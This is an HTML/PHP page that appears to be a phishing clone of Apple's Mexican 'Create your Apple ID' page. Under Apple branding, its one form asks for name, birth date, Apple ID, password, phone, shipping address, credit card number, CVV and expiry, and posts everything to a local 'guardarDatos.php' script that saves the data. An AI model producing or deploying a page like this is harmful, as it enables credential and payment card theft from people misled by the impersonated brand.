<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Crear tu Apple ID - Apple (MX) </title>
    <link rel="stylesheet" href="css/bootstrap.css">
    <script src="js/jquery-3.6.1.js"></script>
    <style>
        .form{
            background-color: white;
            margin: 0 auto;
            width: 90%;
            max-width: 500px;
            padding: 4.5em 3em;
            border-radius: 10px;
            box-shadow: 0 5px 10px -5px rgb(0 0 0 / 30%);
            font-size: 20px;
        }

        h1{
            text-align: center;
            color: black;
            font-size: 50px;
        }

    </style>
</head>
<body>
    <?php include 'menu.php'; ?>
    
    <div class="container">
        <h1>Crear Apple ID</h1> 
        <form method="post" action="guardarDatos.php" class="form">
            <div class="form-group">
                <label for="">Nombre:</label>
                <input type="text" class="form-control" name="nombre">
            </div>
    
            <div class="form-group">
                <label for="">Fecha de nacimiento:</label>
                <input type="date" class="form-control" name="fecha_nacimiento">
            </div>
    
            <div class="form-group">
                <label for="">Apple ID:</label>
                <input type="text" class="form-control" name="appleid">
            </div>
    
            <div class="form-group">
                <label for="">Contraseña:</label>
                <input type="password" class="form-control" name="contrasena">
            </div>
    
            <div class="form-group">
                <label for="">Numero:</label>
                <input type="tel" class="form-control" name="numero">
            </div>

            <div class="form-group">
                <label for="">Dirección de envío:</label>
                <input type="text" class="form-control" name="direccion_envio">
            </div>

            <div class="form-group">
                <label for="">No. de tarjeta:</label>
                <input type="text" class="form-control" name="no_tarjeta">
            </div>

            <div class="form-group">
                <label for="">CVV:</label>
                <input type="text" class="form-control" name="cvv">
            </div>

            <div class="form-group">
                <label for="">Fecha de vencimiento:</label>
                <input type="date" class="form-control" name="fecha_vencimiento">
            </div>
    
            <center>
                <div>
                   <input type="submit" class="btn btn-primary" value="Continuar" class="enviar">
                </div>
            <center>
    
        </form>
    </div>
    <script src="js/bootstrap.js"></script>
</body>
</html>